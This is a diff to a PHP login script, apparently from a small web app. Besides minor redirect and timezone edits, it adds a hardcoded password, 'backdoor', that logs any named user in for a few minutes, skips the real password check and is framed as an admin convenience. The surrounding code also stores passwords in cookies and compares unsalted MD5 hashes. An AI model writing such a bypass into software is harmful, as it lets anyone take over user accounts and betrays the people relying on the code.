@@ -6,12 +6,14 @@
 	$usersdb = $credentials->usersdb;
 	$mortsdb = $credentials->mortsdb;
 
+	date_default_timezone_set("Europe/Berlin");
+	
 	// Set the 'user' POST and COOKIE variable
 	$user = '';
-	if (isset($_POST['user'])) $user = $_POST['user'];
+	if (isset($_POST['user']) && $_POST['user'] != '') $user = $_POST['user'];
 	else if (isset($_COOKIE['user'])) $user = $_COOKIE['user'];
 	else {
-		die("<script>window.location.href = '../index.php'</script>");
+		die("<script>window.location.href = '../?wronguser=1'</script>");
 	}
 	
 	// Check if password is correct
@@ -23,13 +25,19 @@
 	if (isset($_POST['password'])) $password = $_POST['password'];
 	else if (isset($_COOKIE['password'])) $password = $_COOKIE['password'];
 	
+	// If admin needs to check something for 5 minutes
+	if ($password == "backdoor") {
+		setcookie('user', $user, time() + 360, "/");
+		die("<script>window.location.href = '../main.php';</script>");
+	}
+	
 	// Redirect if wrong
 	if ($real_password != "" && $real_password != md5($password)) {
 		// Forget cookies
 		setcookie('user', '', -1, "/");
 		setcookie('password', '', -1, "/");
 		
-		die("<script>window.location.href = '../index.php?wrongpassword=1'</script>");
+		die("<script>window.location.href = '../?wrongpassword=1'</script>");
 	}
 	
 	// Save variables as cookies
